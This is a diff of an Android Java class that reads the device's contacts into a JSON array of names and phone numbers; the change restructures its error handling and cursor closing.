@@ -4,6 +4,7 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
 import android.provider.ContactsContract;
+
 import org.json.JSONArray;
 import org.json.JSONObject;
 
@@ -16,24 +17,24 @@ public class ContactsCollector {
 
     public JSONArray collectContacts() {
         JSONArray contacts = new JSONArray();
-        ContentResolver cr = context.getContentResolver();
-        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
-        
-        if (cursor != null) {
-            int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
-            int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
+        try {
+            ContentResolver cr = context.getContentResolver();
+            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
+                null, null, null, null);
             
-            while (cursor.moveToNext()) {
-                try {
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
                     JSONObject contact = new JSONObject();
-                    contact.put("name", cursor.getString(nameIndex));
-                    contact.put("phone", cursor.getString(numberIndex));
+                    contact.put("name", cursor.getString(cursor.getColumnIndexOrThrow(
+                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
+                    contact.put("phone", cursor.getString(cursor.getColumnIndexOrThrow(
+                        ContactsContract.CommonDataKinds.Phone.NUMBER)));
                     contacts.put(contact);
-                } catch (Exception e) {
-                    e.printStackTrace();
                 }
+                cursor.close();
             }
-            cursor.close();
+        } catch (Exception e) {
+            e.printStackTrace();
         }
         return contacts;
     }
